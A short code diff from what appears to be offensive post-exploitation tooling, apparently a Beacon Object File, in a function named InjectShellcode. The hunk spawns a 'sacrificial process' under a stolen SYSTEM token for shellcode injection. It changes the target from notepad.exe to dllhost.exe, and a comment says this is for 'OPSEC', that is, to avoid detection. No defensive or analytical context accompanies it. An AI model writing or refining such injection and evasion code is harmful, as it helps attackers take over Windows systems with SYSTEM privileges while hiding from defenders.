@@ -194,7 +194,7 @@ BOOL InjectShellcode(HANDLE hSystemToken, unsigned char* shellcode, int shellcod
 
     // Spawn a sacrificial process with SYSTEM token
     // Using a legitimate Windows binary for OPSEC
-    wchar_t target[] = L"C:\\Windows\\System32\\notepad.exe";
+    wchar_t target[] = L"C:\\Windows\\System32\\dllhost.exe";
     
     if (!ADVAPI32$CreateProcessAsUserW(
         hSystemToken,
